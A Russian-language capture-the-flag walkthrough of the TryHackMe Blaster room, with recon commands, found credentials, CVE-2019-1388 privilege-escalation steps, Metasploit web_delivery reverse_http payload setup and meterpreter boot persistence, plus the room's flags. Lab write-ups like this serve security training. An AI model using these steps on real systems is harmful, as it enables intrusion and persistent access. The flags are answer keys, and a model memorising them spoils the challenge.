[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Blaster](https://tryhackme.com/r/room/blaster) 

Всего 4 задания:
## Задание 1
В этой комнате мы рассмотрим альтернативные режимы эксплуатации без использования Metasploit или инструментов 
эксплуатации в целом, помимо nmap и dirbuster. Чтобы завершить комнату, мы вернемся к этим инструментам для 
обеспечения устойчивости и дополнительных шагов, которые мы можем предпринять. Давайте без дальнейших промедлений 
развернем нашу целевую машину!   

Искусство одного из наших участников, Варга -  Профиль THM  -  Instagram  -  Blaster Merch  - Twitter

Эта комната — ремикс моей предыдущей комнаты Retro с некоторыми усложнениями, которые я добавил к той комнате, 
которая была удалена. Для повышения сложности и тренировки терпения, проверьте эту комнату после этой. Кроме того, 
эта комната — продолжение Ice. - DarkStar7471  

#### Ответьте на вопросы ниже
Разверните машину! Это Windows-бокс, поэтому дайте ему несколько минут (3-5 максимум), чтобы выйти в онлайн
```commandline
Ответ не нужен
```

## Задание 2
Теперь, когда мы запустили нашу цель, давайте выполним базовый перечень служб, работающих на ней!

### Ответьте на вопросы ниже
Сколько портов открыто в нашей целевой системе?
```commandline
nmap -A -T4 -p- <IP>
```
```commandline
2
```
Похоже, веб-сервер работает. Каково название страницы, которую мы обнаруживаем при переходе на него?
```commandline
IIS Windows Server
```
Интересно, давайте посмотрим, есть ли что-нибудь еще на этом веб-сервере, проведя фаззинг. Какой скрытый каталог мы 
обнаружим? 
```commandline
gobuster dir --url http//<IP>/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
```commandline
/retro
```
Перейдите в обнаруженный нами скрытый каталог. Какое потенциальное имя пользователя мы там обнаружим?
```commandline
http:/<IP>/retro
```
```commandline
wade
```
Просматривая посты, похоже, что у нашего пользователя недавно возникли некоторые трудности со входом. Какой 
возможный пароль мы обнаруживаем?
`пароль в комментарии.`
```commandline
parzival
```
Войдите в систему через Microsoft Remote Desktop (MSRDP) и прочитайте user.txt. Каково его содержимое?
Используя имя пользователя и пароль, мы успешно вошли в систему и видим, что файл user.txt присутствует на рабочем 
столе. Вы можете просмотреть файл user.txt и отправить флаг пользователя. 
```commandline
THM{HACK_PLAYER_ONE}
```

## Задание 3
Теперь, когда мы получили доступ к нашей целевой системе, давайте посмотрим, сможем ли мы найти способ эскалации. 
Для начала давайте разведаем систему, чтобы посмотреть, сможем ли мы найти что-нибудь интересное. 

### Ответьте на вопросы ниже
При перечислении машины часто бывает полезно посмотреть, что пользователь делал в последний раз. Осмотрите машину и 
посмотрите, сможете ли вы найти CVE, который был исследован на этом сервере. Какой CVE это был? 

Проверив историю браузера, мы получили полезную информацию. После поиска в Google по этой теме мы обнаружили, что мы можем использовать эту уязвимость для получения root-доступа. Если вы хотите узнать об этой уязвимости, вы можете посетить этот сайт.
[CVE-2019–1388 | Уязвимость повышения привилегий в диалоговом окне сертификата Windows](https://infosecwriteups.com/blaster-walkthrough-tryhackme-f44f0adb6814#:~:text=%D0%9F%D0%BE%D1%81%D0%BB%D0%B5%20%D0%BF%D0%BE%D0%B8%D1%81%D0%BA%D0%B0%20%D0%B2,%D0%BE%D0%BA%D0%BD%D0%B5%20%D1%81%D0%B5%D1%80%D1%82%D0%B8%D1%84%D0%B8%D0%BA%D0%B0%D1%82%D0%B0%20Windows)
```commandline
CVE-2019-1388
```
Похоже, что для эксплуатации этой уязвимости необходим исполняемый файл, а пользователь не очень хорошо почистил его 
после тестирования. Как называется этот исполняемый файл? 
Итак, теперь пришло время расширить наши привилегии. Я нашел неудаленный файл в корзине. Давайте 
запустим ее. 
```commandline
hhupd
```
Исследуйте уязвимость и как ее эксплуатировать. Эксплуатируйте ее сейчас, чтобы получить повышенный терминал!
Итак, он запрашивает пароль администратора, давайте нажмем «Показать информацию о сертификате издателя».
И нажмите «VeriSign Commercial Software Publishers CA» после того, как откроется Internet Explorer.
Нажмите «Настройки», «Файл» и нажмите «Сохранить как». Итак, вы видите, что мы получаем ошибку, нажмите «ОК» и в 
поле «Имя файла» введите эту команду `C:\Windows\System32\*.*`   
```commandline
Ответ не нужен
```
Теперь, когда мы создали терминал, давайте продолжим и запустим команду 'whoami'. Какой вывод будет после ее запуска?
```commandline
nt authority\system
```
Теперь, когда мы убедились, что у нас есть повышенный запрос, прочитайте содержимое root.txt на рабочем столе 
администратора. Каково его содержимое? Не выключайте терминал после эксплуатации, чтобы мы могли использовать его в 
четвертой задаче! 
```commandline
cd Desktop
dir
type root.txt
```
```commandline
THM{COIN_OPERATED_EXPLOITATION}
```

## Задание 4
Теперь, когда мы полностью скомпрометировали нашу целевую машину, давайте вернемся к нашим инструментам эксплуатации,
чтобы мы могли получить удаленный доступ к оболочке и сохранить устойчивость. 

### Ответьте на вопросы ниже
Вернитесь к машине атакующего для следующего шага. Поскольку мы знаем, что на нашей машине жертвы запущен Защитник 
Windows, давайте попробуем другой метод доставки полезной нагрузки! Для этого мы будем использовать эксплойт 
веб-доставки скрипта в Metasploit. Запустите Metasploit сейчас и выберите «exploit/multi/script/web_delivery» для 
использования.   

Вернитесь к машине атакующего для следующего шага. Поскольку мы знаем, что на нашей машине жертвы запущен Защитник 
Windows, давайте попробуем другой метод доставки полезной нагрузки! Для этого мы будем использовать эксплойт 
веб-доставки скрипта в Metasploit. Запустите Metasploit сейчас и выберите «exploit/multi/script/web_delivery» для 
использования.  
```commandline
msfconsole
use exploit/multi/script/web_delivery
```
```commandline
Ответ не нужен
```
Сначала давайте установим цель PSH (PowerShell). Какой целевой номер — PSH?
```commandline
show targets
```
```commandline
2
```
После настройки полезной нагрузки настройте lhost и lport соответствующим образом, чтобы знать, на каком порту будет 
работать веб-сервер MSF и что он будет работать в сети TryHackMe. 
```commandline
options
set lhost <IP>
set lport 4444
```
```commandline
Ответ не нужен
```
Наконец, давайте установим нашу полезную нагрузку. В этом случае мы будем использовать простую обратную полезную 
нагрузку HTTP. Сделайте это сейчас с помощью команды: 'set payload windows/meterpreter/reverse_http'. После этого 
запустите атаку как задание с помощью команды 'run -j'.  скопируйте эксплойт и вставьте его на взломанную машину, 
чтобы получить обратное соединение. 
```commandline
set payload windows/meterpreter/reverse_http'
run -j
```
```commandline
Ответ не нужен
```
Вернитесь в терминал, который мы создали с помощью нашего эксплойта. В этот терминал вставьте вывод команды 
Metasploit после запуска задания. В этом случае я обнаружил, что особенно полезно разместить простой веб-сервер 
Python (python3 -m http.server) и разместить команду в текстовом файле, поскольку копирование и вставка между 
машинами не всегда будут работать. После запуска этой команды вернитесь на нашу атакующую машину и обратите внимание,
что наша обратная оболочка создана.     
```commandline
Ответ не нужен
```
И последнее, но не менее важное: давайте рассмотрим механизмы сохранения через Metasploit. Какую команду мы можем 
запустить в нашей консоли meterpreter, чтобы настроить сохранение, которое автоматически запускается при загрузке 
системы? Не включайте ничего, кроме базовой команды и опции для запуска загрузки.   
```commandline
run persistence -X
```
Запустите эту команду сейчас с параметрами, которые позволяют ей подключиться обратно к вашей хост-машине в случае 
перезагрузки системы. Обратите внимание, что вам нужно будет создать слушателя через эксплойт обработчика, чтобы 
разрешить это удаленное подключение на практике. Поздравляем, теперь вы получили полный контроль над удаленным 
хостом и установили постоянство для дальнейших операций!    
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)